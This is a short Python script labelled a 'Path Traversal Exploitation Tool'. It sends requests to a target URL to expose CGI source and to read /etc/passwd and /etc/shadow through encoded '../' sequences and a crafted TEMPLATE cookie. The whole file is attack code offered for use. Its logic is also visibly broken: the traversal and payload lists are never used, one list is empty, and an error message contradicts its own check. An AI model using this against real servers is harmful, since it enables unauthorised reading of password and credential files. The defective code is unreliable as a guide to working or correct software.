import argparse, requests, pprint

def main(url):
    if args.url:
        ident = [

        ]
        if str('cgi-bin/main.cgi?file=') in args.url:
            try:
                req = requests.get(args.url + 'main.cgi') # Attempting to show the CGI Source Code
                print(req.text)
            except:
                print('Error has occurred!')
        elif str('?file=') in args.url:
            traversal = [
                    '%2e%2e%2f',            # aka (../)
                    '%2e%2e/',              # aka (../)
                    '..%2f',                # aka (../)
                    '%2e%2e%5c',            # aka (..\)
                    '..%5c',                # aka (..\)
                    '%252e%252e%255c',      # aka (..\)
                    '..%255c',              # aka (..\)
                    '..%c0%af',             # aka (../)
                    '..%c1%9c'              # aka (..\)
            ]
            nix_payloads = [
                'etc/shadow',               # *NIX password file exploitation
                'etc/passwd'                # *NIX password file exploitation
            ]
        elif str('.php') in args.url:
            headers = {
                'Cookie':'TEMPLATE=../../../../../../../../../etc/passwd'
            }
            req = requests.get(args.url, headers=headers)
            if req.status_code == 200:
                print(req.text)
            else:
                print('Server error has occurred!')
        else:
            print('')
            print('Url cannot include a file! Find another Url!')
            print('example: http://some_site.com.br/get-files.php?file=')  
    else:
        print('Invalid argument used! Please try again.')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Path Traversal Exploitation Tool')
    parser.add_argument('-url', required=True, type=str, help='Target url')
    args = parser.parse_args()
    url = args.url    
    main(url)
